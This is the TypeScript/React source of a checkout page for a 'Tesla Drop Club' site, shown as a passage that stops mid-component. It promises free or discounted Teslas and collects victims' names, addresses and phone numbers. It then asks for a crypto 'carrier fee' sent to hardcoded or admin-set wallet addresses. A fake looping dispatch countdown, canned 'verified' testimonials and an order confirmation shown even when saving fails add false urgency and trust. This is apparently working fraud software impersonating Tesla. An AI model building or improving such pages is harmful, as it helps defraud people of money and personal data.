import { useState, useEffect, useMemo, useCallback } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import {
  ArrowLeft,
  ArrowRight,
  Check,
  CheckCircle2,
  Clock3,
  Copy,
  ExternalLink,
  Gift,
  HelpCircle,
  Lock,
  PackageCheck,
  QrCode as QrIcon,
  ShieldCheck,
  Sparkles,
  Ticket,
  Truck,
  Wallet,
  Zap,
  Loader2,
  Printer,
  Download,
  Star,
  FileText,
  X,
  RotateCcw,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { QrCode } from "@/components/QrCode";
import { COUNTRIES } from "@/lib/countries";
import { SiteHeader } from "@/components/SiteHeader";
import { formatDisplayPrice, formatFeeDisplay } from "@/lib/priceFormatter";
import {
  fetchLiveCryptoRates,
  calculateCryptoAmount,
  getWalletDeepLink,
  getMetaMaskDeepLink,
  getTrustWalletDeepLink,
  type CryptoRates,
  FALLBACK_RATES,
} from "@/lib/cryptoRates";
import {
  getCachedDrops,
  getCachedSiteConfig,
  getCachedWalletConfig,
  getCachedTestimonials,
  setCachedDrops,
  setCachedSiteConfig,
  setCachedWalletConfig,
  setCachedTestimonials,
} from "@/lib/cache";
import {
  fetchDrops,
  fetchSiteConfig,
  fetchWalletConfig,
  fetchWalletQrUrls,
  createOrder,
  fetchTestimonials,
  DEFAULT_TESTIMONIALS,
  type DbDrop,
  type DbSiteConfig,
  type DbWalletConfig,
  type DbTestimonial,
} from "@/lib/supabase";

export const Route = createFileRoute("/checkout")({
  validateSearch: (search: Record<string, unknown>) => {
    return {
      dropId: typeof search.dropId === "string" ? search.dropId : "",
      action: search.action === "shop" ? ("shop" as const) : ("giveaway" as const),
    };
  },
  head: () => ({
    meta: [
      { title: "Tesla Allocation & Checkout — Tesla Drop Club" },
      { name: "description", content: "Complete your Tesla delivery allocation and carrier dispatch reservation." },
      { property: "og:title", content: "Tesla Allocation & Checkout" },
    ],
  }),
  component: CheckoutPage,
});

function formatCountdown(totalSeconds: number) {
  const remaining = Math.max(0, totalSeconds);
  const days = Math.floor(remaining / 86400);
  const hours = Math.floor((remaining % 86400) / 3600);
  const minutes = Math.floor((remaining % 3600) / 60);
  const seconds = remaining % 60;
  return `${days}d ${String(hours).padStart(2, "0")}h ${String(minutes).padStart(2, "0")}m ${String(seconds).padStart(2, "0")}s`;
}

function CryptoIcon({ coin, size = 18 }: { coin: string; size?: number }) {
  const c = (coin || "").toUpperCase().trim();
  if (c === "BTC" || c === "BITCOIN") {
    return (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none" className="shrink-0 drop-shadow-xs">
        <circle cx="16" cy="16" r="16" fill="#F7931A" />
        <path
          d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.114-.92-.22-1.385-.326l.695-2.783-1.728-.431-.709 2.839c-.376-.086-.745-.17-1.104-.26l.002-.007-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.183-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.314-1.256-.314l-.858 1.978 2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.727.43.708-2.84c.472.127.93.245 1.378.357l-.705 2.828 1.728.432.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538zm-3.95 5.538c-.535 2.146-4.148.986-5.319.695l.949-3.805c1.172.292 4.93.872 4.37 3.11zm.536-5.568c-.487 1.953-3.495.96-4.47.717l.86-3.45c.975.243 4.118.697 3.61 2.733z"
          fill="#FFFFFF"
        />
      </svg>
    );
  }
  if (c === "ETH" || c === "ETHEREUM") {
    return (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none" className="shrink-0 drop-shadow-xs">
        <circle cx="16" cy="16" r="16" fill="#627EEA" />
        <path d="M16.498 4v8.87l7.497 3.35z" fill="#FFF" fillOpacity=".6" />
        <path d="M16.498 4L9 16.22l7.498-3.35z" fill="#FFF" />
        <path d="M16.498 21.968v6.027L24 17.616z" fill="#FFF" fillOpacity=".6" />
        <path d="M16.498 27.995v-6.028L9 17.616z" fill="#FFF" />
        <path d="M16.498 20.573l7.497-4.353-7.497-3.348z" fill="#FFF" fillOpacity=".2" />
        <path d="M9 16.22l7.498 4.353v-7.701z" fill="#FFF" fillOpacity=".6" />
      </svg>
    );
  }
  if (c === "USDT" || c === "TETHER") {
    return (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none" className="shrink-0 drop-shadow-xs">
        <circle cx="16" cy="16" r="16" fill="#26A17B" />
        <path d="M17.922 17.383c-.11.008-.68.04-1.895.04-1.045 0-1.696-.032-1.87-.04-4.22-.187-7.37-1.025-7.37-2.029 0-1.003 3.15-1.841 7.37-2.03v3.232c.178.012.839.043 1.888.043 1.189 0 1.767-.035 1.877-.043v-3.23c4.212.188 7.354 1.026 7.354 2.028 0 1.004-3.142 1.842-7.354 2.03v-.001zm0-4.394v-2.31h5.83V7.613H8.297v3.066h5.755v2.31c-4.78.225-8.384 1.25-8.384 2.483 0 1.233 3.604 2.257 8.384 2.482v7.75h3.87v-7.75c4.773-.225 8.367-1.25 8.367-2.482 0-1.233-3.594-2.258-8.367-2.483z" fill="#FFF"/>
      </svg>
    );
  }
  if (c === "USDC") {
    return (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none" className="shrink-0 drop-shadow-xs">
        <circle cx="16" cy="16" r="16" fill="#2775CA" />
        <path d="M16 6.25A9.75 9.75 0 1025.75 16 9.76 9.76 0 0016 6.25zm0 17.5A7.75 7.75 0 1123.75 16 7.76 7.76 0 0116 23.75z" fill="#FFF" fillOpacity=".3"/>
        <path d="M17.15 11.2h-2.1v1.16a3.68 3.68 0 00-2.3 1.34 3.1 3.1 0 00-.6 1.94c0 1.8 1.1 2.65 3.3 2.95 1.45.2 1.8.65 1.8 1.4 0 .75-.6 1.3-1.6 1.3a2.53 2.53 0 01-2.2-1.2l-1.6 1a4.2 4.2 0 003.5 2v1.2h2.1v-1.2a3.78 3.78 0 002.5-1.4 3.3 3.3 0 00.7-2.1c0-1.85-1.15-2.75-3.45-3.05-1.4-.2-1.75-.65-1.75-1.3 0-.65.55-1.2 1.45-1.2a2.38 2.38 0 011.95 1l1.6-.9a3.9 3.9 0 00-3.05-1.74z" fill="#FFF"/>
      </svg>
    );
  }
  return <Wallet size={size} />;
}

export function CheckoutPage() {
  const search = Route.useSearch();
  const navigate = useNavigate();

  // Instant hydration from cache to eliminate redirect latency
  const initialDrops = getCachedDrops();
  const initialSite = getCachedSiteConfig();
  const initialWallet = getCachedWalletConfig();
  const initialTestimonials = getCachedTestimonials();

  // Restore saved active order from localStorage so app switching never wipes confirmation screen
  const [submittedOrder, setSubmittedOrder] = useState<any | null>(() => {
    if (typeof window === "undefined") return null;
    try {
      const saved = localStorage.getItem("tdc_active_order");
      return saved ? JSON.parse(saved) : null;
    } catch {
      return null;
    }
  });

  // Restore form draft fields from localStorage
  const savedDraft = useMemo(() => {
    if (typeof window === "undefined") return null;
    try {
      const raw = localStorage.getItem("tdc_checkout_draft");
      return raw ? JSON.parse(raw) : null;
    } catch {
      return null;
    }
  }, []);

  const [loading, setLoading] = useState<boolean>(initialDrops.length === 0);
  const [drops, setDrops] = useState<DbDrop[]>(initialDrops);
  const [siteConfig, setSiteConfig] = useState<DbSiteConfig | null>(initialSite);
  const [walletConfig, setWalletConfig] = useState<DbWalletConfig | null>(initialWallet);
  const [qrUrls, setQrUrls] = useState<{ primaryQr: string; secondaryQr: string }>({ primaryQr: "", secondaryQr: "" });
  const [testimonials, setTestimonials] = useState<DbTestimonial[]>(
    initialTestimonials.length > 0 ? initialTestimonials : DEFAULT_TESTIMONIALS
  );
  const [cryptoRates, setCryptoRates] = useState<CryptoRates>(FALLBACK_RATES);
  const [showSlipModal, setShowSlipModal] = useState(false);

  const [selectedDropId, setSelectedDropId] = useState<string>(search.dropId || "");
  const [copied, setCopied] = useState(false);
  const [copiedAmount, setCopiedAmount] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  // Form Fields with draft hydration
  const [email, setEmail] = useState(() => savedDraft?.email || "");
  const [fullName, setFullName] = useState(() => savedDraft?.fullName || "");
  const [phone, setPhone] = useState(() => savedDraft?.phone || "");
  const [street, setStreet] = useState(() => savedDraft?.street || "");
  const [apartment, setApartment] = useState(() => savedDraft?.apartment || "");
  const [city, setCity] = useState(() => savedDraft?.city || "");
  const [stateProvince, setStateProvince] = useState(() => savedDraft?.stateProvince || "");
  const [postalCode, setPostalCode] = useState(() => savedDraft?.postalCode || "");
  const [country, setCountry] = useState(() => savedDraft?.country || "United States");
  const [crypto, setCrypto] = useState(
    initialWallet?.accepted_coins?.[0] || initialWallet?.primary_coin || "BTC"
  );

  // Sync draft to localStorage so user doesn't lose inputs on reload
  useEffect(() => {
    if (typeof window !== "undefined" && !submittedOrder) {
      try {
        localStorage.setItem(
          "tdc_checkout_draft",
          JSON.stringify({
            email,
            fullName,
            phone,
            street,
            apartment,
            city,
            stateProvince,
            postalCode,
            country,
          })
        );
      } catch {}
    }
  }, [email, fullName, phone, street, apartment, city, stateProvince, postalCode, country, submittedOrder]);

  // Sync submitted order to localStorage
  useEffect(() => {
    if (typeof window !== "undefined") {
      try {
        if (submittedOrder) {
          localStorage.setItem("tdc_active_order", JSON.stringify(submittedOrder));
        } else {
          localStorage.removeItem("tdc_active_order");
        }
      } catch {}
    }
  }, [submittedOrder]);

  const handleStartNewOrder = () => {
    if (typeof window !== "undefined") {
      try {
        localStorage.removeItem("tdc_active_order");
      } catch {}
    }
    setSubmittedOrder(null);
  };

  // Live carrier dispatch countdown (ticking live)
  const [dispatchSeconds, setDispatchSeconds] = useState(86400 + 14400 + 1800);

  useEffect(() => {
    const timer = setInterval(() => {
      setDispatchSeconds((s) => (s > 1 ? s - 1 : 86400));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const loadData = useCallback(async () => {
    try {
      const [d, s, w, q, t, rates] = await Promise.all([
        fetchDrops(),
        fetchSiteConfig(),
        fetchWalletConfig(),
        fetchWalletQrUrls(),
        fetchTestimonials(),
        fetchLiveCryptoRates(),
      ]);
      setDrops(d);
      setSiteConfig(s);
      setWalletConfig(w);
      setQrUrls(q);
      setTestimonials(t);
      setCryptoRates(rates);

      setCachedDrops(d);
      setCachedSiteConfig(s);
      setCachedWalletConfig(w);
      setCachedTestimonials(t);

      if (s?.icon_url) {
        let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
        if (!link) {
          link = document.createElement("link");
          link.rel = "icon";
          document.head.appendChild(link);
        }
        link.href = s.icon_url;
      }

      if (!crypto && w.accepted_coins && w.accepted_coins.length > 0) {
        setCrypto(w.accepted_coins[0]);
      } else if (!crypto) {
        setCrypto(w.primary_coin || "BTC");
      }
    } catch (err) {
      console.error("Error loading checkout data:", err);
    } finally {
      setLoading(false);
    }
  }, [crypto]);

  useEffect(() => {
    loadData();
  }, [loadData]);

  // Selected drop
  const currentDrop = useMemo(() => {
    if (!drops.length) return null;
    if (selectedDropId) {
      const match = drops.find((d) => d.id === selectedDropId);
      if (match) return match;
    }
    return drops[0];
  }, [drops, selectedDropId]);

  // Active wallet address calculation
  const activeWalletAddress = useMemo(() => {
    if (!walletConfig) return "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
    if (crypto === walletConfig.secondary_coin && walletConfig.secondary_address?.trim()) {
      return walletConfig.secondary_address.trim();
    }
    if (walletConfig.primary_address?.trim()) {
      return walletConfig.primary_address.trim();
    }
    if (walletConfig.secondary_address?.trim()) {
      return walletConfig.secondary_address.trim();
    }
    return crypto === "BTC"
      ? "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
      : "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
  }, [crypto, walletConfig]);

  // Active QR image if uploaded from admin
  const activeQrImage = useMemo(() => {
    if (!walletConfig) return "";
    if (crypto === walletConfig.secondary_coin && qrUrls.secondaryQr) {
      return qrUrls.secondaryQr;
    }
    if (qrUrls.primaryQr) {
      return qrUrls.primaryQr;
    }
    return "";
  }, [crypto, walletConfig, qrUrls]);

  const copyAddress = async (addr?: string) => {
    const target = addr || activeWalletAddress;
    if (!target) return;
    try {
      await navigator.clipboard.writeText(target);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch {
      const el = document.createElement("textarea");
      el.value = target;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    }
  };

  const copyAmount = async (amountStr: string) => {
    const cleanNum = amountStr.replace(/[^0-9.]/g, "");
    if (!cleanNum) return;
    try {
      await navigator.clipboard.writeText(cleanNum);
      setCopiedAmount(true);
      setTimeout(() => setCopiedAmount(false), 2500);
    } catch {
      const el = document.createElement("textarea");
      el.value = cleanNum;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
      setCopiedAmount(true);
      setTimeout(() => setCopiedAmount(false), 2500);
    }
  };

  const openWalletApp = (coinName: string, addr: string, cryptoVal: number) => {
    const deepLink = getWalletDeepLink(coinName, addr, cryptoVal);
    window.location.href = deepLink;
  };

  // Live Crypto Conversions for current drop and submitted order
  const currentCryptoCalc = useMemo(() => {
    if (!currentDrop) {
      return { formatted: "0 BTC", cryptoValue: 0, symbol: crypto || "BTC", fullDisplay: "0" };
    }
    return calculateCryptoAmount(currentDrop.delivery_fee, crypto, cryptoRates);
  }, [currentDrop, crypto, cryptoRates]);

  const submittedCryptoCalc = useMemo(() => {
    if (!submittedOrder) return null;
    return calculateCryptoAmount(submittedOrder.fee, submittedOrder.crypto, cryptoRates);
  }, [submittedOrder, cryptoRates]);

  const handleSubmitOrder = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentDrop) return;
    setSubmitting(true);

    const formattedAddress = [street, apartment, city, stateProvince, postalCode, country]
      .filter(Boolean)
      .join(", ");

    const orderRef = Math.random().toString(36).substring(2, 9).toUpperCase();
    const notes = `Phone: ${phone || "N/A"} | Carrier Dispatch Reference: #${orderRef} | Crypto: ${crypto || "BTC"}`;

    const orderObj = {
      ref: orderRef,
      drop: currentDrop,
      fullName: fullName.trim(),
      email: email.trim(),
      address: formattedAddress,
      crypto: crypto || "BTC",
      fee: currentDrop.delivery_fee,
      walletAddress: activeWalletAddress,
    };

    try {
      await createOrder({
        drop_id: currentDrop.id,
        drop_name: currentDrop.name,
        kind: currentDrop.kind,
        email: email.trim(),
        full_name: fullName.trim(),
        address: formattedAddress,
        status: "entered",
        crypto: crypto || "BTC",
        amount: currentDrop.kind === "shop" ? currentDrop.amount : "",
        delivery_fee: currentDrop.delivery_fee,
        notes,
      });

      setSubmittedOrder(orderObj);
    } catch (err) {
      console.warn("Order creation note:", err);
      // Still show confirmation state so user gets payment details and allocation reference
      setSubmittedOrder(orderObj);
    } finally {
      setSubmitting(false);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  if (loading && !currentDrop && !submittedOrder) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background">
        <div className="flex flex-col items-center gap-3">
          <Loader2 size={36} className="animate-spin text-foreground" />
          <p className="text-sm font-bold text-muted-foreground">Preparing Tesla Allocation Portal...</p>
        </div>
      </div>
    );
  }

  if (!currentDrop && !submittedOrder) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-4 bg-background p-6 text-center">
        <h1 className="text-2xl font-bold">No Vehicle Selected</h1>
        <p className="text-sm text-muted-foreground">Please select an available Tesla model from the fleet.</p>
        <Link to="/" className="inline-flex items-center gap-2 rounded-full bg-foreground px-6 py-2.5 text-sm font-bold text-background">
          <ArrowLeft size={16} /> Return to Tesla Fleet
        </Link>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background text-foreground pb-20">
      {/* ── STATIC TOP NAVIGATION BAR (Brand Logo, Fleet Nav, Search, Notifications) ── */}
      <SiteHeader
        siteConfig={siteConfig}
        drops={drops}
        currentPage="checkout"
      />

      {/* ── SUB-BAR: Navigation Breadcrumb & Security Status ── */}
      <div className="border-b border-border bg-card/60 px-4 sm:px-6 py-2.5">
        <div className="mx-auto flex max-w-6xl items-center justify-between">
          <Link
            to="/"
            className="inline-flex items-center gap-1.5 text-xs sm:text-sm font-semibold text-muted-foreground hover:text-foreground transition-colors"
          >
            <ArrowLeft size={15} />
            <span>Back to Tesla Fleet</span>
          </Link>
          <div className="flex items-center gap-2">
            <span className="inline-flex items-center gap-1.5 rounded-full border border-border bg-background px-3 py-1 text-xs font-bold shadow-xs">
              <ShieldCheck size={13} className="text-emerald-500" />
              <span>Carrier Allocation & Priority Transport Desk</span>
            </span>
          </div>
        </div>
      </div>

      {/* Main Checkout Container */}
      <main className="mx-auto max-w-6xl px-4 sm:px-6 pt-8">
        {submittedOrder ? (
          <div className="space-y-12">
            {/* ── ORDER CONFIRMED VIEW (Persists across reloads & app switching) ── */}
            <div className="mx-auto max-w-2xl rounded-2xl border border-border bg-card p-6 sm:p-10 shadow-xl">
              <div className="flex flex-col items-center text-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-500 mb-4">
                  <CheckCircle2 size={36} />
                </div>
                <span className="text-xs font-black tracking-widest text-muted-foreground uppercase">
                  Allocation Confirmed
                </span>
                <h1 className="mt-1 font-serif text-3xl font-bold sm:text-4xl">
                  Reservation Priority Locked!
                </h1>
                <p className="mt-2 text-sm text-muted-foreground max-w-md">
                  Your vehicle allocation for <strong>{submittedOrder.drop.name}</strong> is reserved under allocation reference <strong>#{submittedOrder.ref}</strong>.
                </p>
              </div>

              {/* Carrier Dispatch Countdown Box */}
              <div className="mt-6 rounded-xl border border-border bg-muted/60 p-4 sm:p-5">
                <div className="flex items-center justify-between flex-wrap gap-3">
                  <div className="flex items-center gap-2.5">
                    <div className="flex h-9 w-9 items-center justify-center rounded-full bg-foreground text-background">
                      <Truck size={17} />
                    </div>
                    <div>
                      <p className="text-xs font-bold text-foreground">Estimated Carrier Dispatch</p>
                      <p className="text-[11px] text-muted-foreground">Enclosed white-glove transport to your address</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5 font-mono text-sm font-black text-foreground bg-background px-3 py-1.5 rounded-lg border border-border">
                    <Clock3 size={14} className="text-emerald-500" />
                    <span>{formatCountdown(dispatchSeconds)}</span>
                  </div>
                </div>
              </div>

              {/* 1-Device Easy Payment Transfer Box */}
              <div className="mt-6 rounded-xl border-2 border-foreground/20 bg-muted/30 p-5 sm:p-6 space-y-4">
                <div className="flex items-center justify-between border-b border-border pb-3">
                  <div>
                    <h3 className="text-sm font-bold text-foreground">Delivery & Processing Fee</h3>
                    <p className="text-xs text-muted-foreground">
                      Transfer fee via {submittedOrder.crypto} to lock in carrier routing
                    </p>
                  </div>
                  <div className="text-right">
                    <span className="font-mono text-lg font-black text-foreground block">
                      {formatFeeDisplay(submittedOrder.fee)}
                    </span>
                    {submittedCryptoCalc && (
                      <span className="font-mono text-xs text-emerald-600 dark:text-emerald-400 font-bold">
                        ≈ {submittedCryptoCalc.formatted}
                      </span>
                    )}
                  </div>
                </div>

                {/* Single Device Friendly Tip Banner */}
                <div className="rounded-lg bg-emerald-500/10 border border-emerald-500/20 p-3 text-xs text-emerald-800 dark:text-emerald-300 flex items-start gap-2.5">
                  <ShieldCheck size={16} className="text-emerald-600 shrink-0 mt-0.5" />
                  <div>
                    <strong>One-Device Mobile Tip:</strong> Cannot scan the QR code? Tap <strong>"Open in {submittedOrder.crypto} Wallet"</strong> below to automatically launch your wallet app with the address and amount pre-filled!
                  </div>
                </div>

                {/* QR Code and Wallet address display */}
                <div className="flex flex-col sm:flex-row items-center gap-5 pt-1">
                  <div className="flex flex-col items-center justify-center p-3 rounded-xl bg-white border border-border shadow-xs shrink-0">
                    {activeQrImage ? (
                      <img src={activeQrImage} alt="Payment QR code" className="h-32 w-32 object-contain" />
                    ) : (
                      <QrCode value={submittedOrder.walletAddress} size={128} />
                    )}
                    <span className="text-[10px] font-bold text-black mt-1">Scan or Tap Open Below</span>
                  </div>

                  <div className="space-y-3 flex-1 w-full min-w-0">
                    <div>
                      <label className="text-xs font-bold text-muted-foreground block mb-1">
                        Carrier Escrow {submittedOrder.crypto} Address:
                      </label>
                      <Input
                        readOnly
                        value={submittedOrder.walletAddress}
                        className="font-mono text-xs bg-background h-10 select-all"
                      />
                    </div>

                    {/* 1-Click Action Buttons for Mobile Users */}
                    <div className="flex flex-wrap items-center gap-2 pt-1">
                      <Button
                        type="button"
                        className="h-10 px-4 rounded-xl font-bold text-xs bg-foreground text-background hover:opacity-90 shadow-sm cursor-pointer"
                        onClick={() =>
                          openWalletApp(
                            submittedOrder.crypto,
                            submittedOrder.walletAddress,
                            submittedCryptoCalc?.cryptoValue || 0
                          )
                        }
                      >
                        <ExternalLink size={14} className="mr-1.5" />
                        Open in {submittedOrder.crypto} Wallet
                      </Button>

                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        className="h-10 px-3 shrink-0 rounded-xl font-bold text-xs cursor-pointer"
                        onClick={() => copyAddress(submittedOrder.walletAddress)}
                      >
                        {copied ? <Check size={14} className="text-emerald-500 mr-1.5" /> : <Copy size={14} className="mr-1.5" />}
                        {copied ? "Address Copied" : "Copy Address"}
                      </Button>

                      {submittedCryptoCalc && (
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          className="h-10 px-3 shrink-0 rounded-xl font-bold text-xs cursor-pointer"
                          onClick={() => copyAmount(submittedCryptoCalc.formatted)}
                        >
                          {copiedAmount ? <Check size={14} className="text-emerald-500 mr-1.5" /> : <Copy size={14} className="mr-1.5" />}
                          {copiedAmount ? "Amount Copied" : `Copy Exact Amount (${submittedCryptoCalc.cryptoValue.toFixed(4)})`}
                        </Button>
                      )}
                    </div>

                    {/* Quick App Universal Links */}
                    <div className="flex items-center flex-wrap gap-2 pt-1 text-[11px] text-muted-foreground">
                      <span>Quick Launch:</span>
                      <a
                        href={getMetaMaskDeepLink(submittedOrder.walletAddress, submittedCryptoCalc?.cryptoValue)}
                        className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full border border-border bg-card hover:bg-muted font-bold text-foreground text-[10px]"
                      >
                        <ExternalLink size={10} /> MetaMask
                      </a>
                      <a
                        href={getTrustWalletDeepLink(submittedOrder.crypto, submittedOrder.walletAddress, submittedCryptoCalc?.cryptoValue)}
                        className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full border border-border bg-card hover:bg-muted font-bold text-foreground text-[10px]"
                      >
                        <ExternalLink size={10} /> Trust Wallet
                      </a>
                    </div>
                  </div>
                </div>

                <p className="text-[11px] text-muted-foreground leading-relaxed pt-2 border-t border-border/50">
                  {submittedCryptoCalc ? (
                    <>Send exactly <strong>{submittedCryptoCalc.formatted}</strong> ({formatFeeDisplay(submittedOrder.fee)} USD) to secure the transport carrier slot.</>
                  ) : (
                    <>Send exact delivery fee to secure the transport carrier slot.</>
                  )} Once confirmed, your carrier bill of lading and vehicle VIN tracking will be dispatched to <strong>{submittedOrder.email}</strong>.
                </p>
              </div>

              {/* Recipient and Address Summary */}
              <div className="mt-6 rounded-xl border border-border bg-card p-4 space-y-2 text-xs">
                <div className="flex justify-between border-b border-border/50 pb-2">
                  <span className="text-muted-foreground">Recipient Name:</span>
                  <span className="font-bold">{submittedOrder.fullName}</span>
                </div>
                <div className="flex justify-between border-b border-border/50 pb-2">
                  <span className="text-muted-foreground">Recipient Email:</span>
                  <span className="font-bold">{submittedOrder.email}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Registered Delivery Address:</span>
                  <span className="font-bold text-right max-w-xs">{submittedOrder.address}</span>
                </div>
              </div>

              <div className="mt-8 flex flex-col sm:flex-row items-center justify-between gap-3 pt-4 border-t border-border no-print">
                <div className="flex items-center gap-2 w-full sm:w-auto">
                  <Link to="/" className="w-full sm:w-auto">
                    <Button variant="outline" className="w-full rounded-full font-bold h-11">
                      ← Back to Tesla Fleet
                    </Button>
                  </Link>
                  <Button
                    variant="ghost"
                    size="sm"
                    className="text-xs text-muted-foreground hover:text-foreground h-11"
                    onClick={handleStartNewOrder}
                  >
                    <RotateCcw size={13} className="mr-1" /> New Claim
                  </Button>
                </div>
                <Button
                  className="w-full sm:w-auto rounded-full font-bold h-11 px-8 shadow-md cursor-pointer"
                  onClick={() => setShowSlipModal(true)}
                >
                  <Printer size={15} className="mr-1.5" /> Print / Save Allocation Slip
                </Button>
              </div>
            </div>

            {/* ── TESTIMONIALS OF OTHER RECIPIENTS ─────────────────── */}
            <div className="mt-12 no-print space-y-6">
              <div className="text-center space-y-1">
                <span className="inline-flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider text-emerald-500 bg-emerald-500/10 px-3 py-1 rounded-full">
                  <ShieldCheck size={14} /> Verified Tesla Deliveries
                </span>
                <h2 className="text-2xl sm:text-3xl font-serif font-bold text-foreground">
                  Recent Allocation Recipients
                </h2>
                <p className="text-xs text-muted-foreground max-w-md mx-auto">
                  Verified recipients who completed carrier transport fee settlement and received vehicle delivery.
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {testimonials.map((t) => (
                  <div key={t.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        {t.image_url ? (
                          <img src={t.image_url} alt={t.name} className="h-10 w-10 rounded-full object-cover border border-border" />
                        ) : (
                          <div className="h-10 w-10 rounded-full bg-muted flex items-center justify-center font-bold text-xs">{t.name.charAt(0)}</div>
                        )}
                        <div>
                          <div className="flex items-center gap-1">
                            <span className="text-xs font-bold text-foreground">{t.name}</span>
                            <CheckCircle2 size={12} className="text-emerald-500" />
                          </div>
                          <span className="text-[10px] text-muted-foreground">{t.location}</span>
                        </div>
                      </div>
                      <div className="flex text-amber-400">
                        {Array.from({ length: t.rating || 5 }).map((_, i) => (
                          <Star key={i} size={11} fill="currentColor" />
                        ))}
                      </div>
                    </div>

                    <p className="text-xs text-foreground/85 italic leading-relaxed">
                      "{t.quote}"
                    </p>

                    <div className="flex items-center justify-between text-[11px] border-t border-border/50 pt-2 text-muted-foreground">
                      <span className="font-semibold text-foreground truncate mr-2">{t.vehicle_model}</span>
                      <span className="text-[9px] bg-muted px-2 py-0.5 rounded shrink-0">Delivered</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ) : (
          /* ── FULL CHECKOUT FORM ────────────────────────────────── */
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            {/* Left Column: Vehicle Summary Card (Sticky) */}
            <aside className="lg:col-span-5 space-y-5 lg:sticky lg:top-24">
              <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-lg">
                {/* Vehicle Image Frame */}
                <div className="relative aspect-[16/10] bg-muted overflow-hidden">
                  {currentDrop?.image_url ? (
                    <img
                      src={currentDrop.image_url}
                      alt={currentDrop.name}
                      className="h-full w-full object-cover"
                    />
                  ) : (
                    <div className="flex h-full w-full items-center justify-center">
                      <Zap size={36} className="text-muted-foreground/40" />
                    </div>
                  )}
                  <span className={`absolute top-3 left-3 inline-flex items-center gap-1.5 rounded-full px-3 py-1 text-xs font-black uppercase tracking-wider ${
                    currentDrop?.kind === "giveaway"
                      ? "bg-foreground text-background shadow-md"
                      : "bg-emerald-600 text-white shadow-md"
                  }`}>
                    {currentDrop?.kind === "giveaway" ? <Gift size={12} /> : <Zap size={12} />}
                    {currentDrop?.kind === "giveaway" ? "Free Promotional Giveaway" : "Immediate Allocation"}
                  </span>
                </div>

                {/* Vehicle Details */}
                <div className="p-5 sm:p-6 space-y-4">
                  <div>
                    <span className="text-[11px] font-black uppercase tracking-wider text-muted-foreground">
                      {currentDrop?.category}
                    </span>
                    <h2 className="font-serif text-2xl font-bold text-foreground mt-0.5">
                      {currentDrop?.name}
                    </h2>
                    <p className="mt-2 text-xs text-muted-foreground leading-relaxed">
                      {currentDrop?.description}
                    </p>
                  </div>

                  {/* Pricing Breakdown with Zero Stray Commas */}
                  <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-2.5">
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-muted-foreground">MSRP / Prize Value:</span>
                      <span className="font-bold line-through text-muted-foreground">
                        {formatDisplayPrice(currentDrop?.prize_value)}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-xs">
                      <span className="text-muted-foreground">
                        {currentDrop?.kind === "giveaway" ? "Vehicle Promotional Price:" : "Direct Purchase Price:"}
                      </span>
                      <span className="font-bold text-foreground">
                        {currentDrop?.kind === "giveaway" ? "FREE ($0.00)" : formatDisplayPrice(currentDrop?.amount)}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-xs border-t border-border pt-2">
                      <span className="font-bold text-foreground">Transport & Carrier Fee:</span>
                      <div className="text-right">
                        <span className="font-mono text-sm font-black text-foreground block">
                          {formatFeeDisplay(currentDrop?.delivery_fee)}
                        </span>
                        <span className="font-mono text-[10px] text-emerald-600 dark:text-emerald-400 font-bold block">
                          ≈ {currentCryptoCalc.formatted}
                        </span>
                      </div>
                    </div>

                    <div className="flex items-center justify-between text-[11px] text-muted-foreground">
                      <span>Delivery Timeframe:</span>
                      <span className="font-semibold text-foreground">{currentDrop?.delivery_time}</span>
                    </div>
                  </div>

                  {/* Vehicle Switcher dropdown */}
                  <div className="space-y-1.5 pt-1">
                    <label className="text-[11px] font-bold text-muted-foreground uppercase">
                      Select Another Tesla Model:
                    </label>
                    <select
                      value={currentDrop?.id}
                      onChange={(e) => {
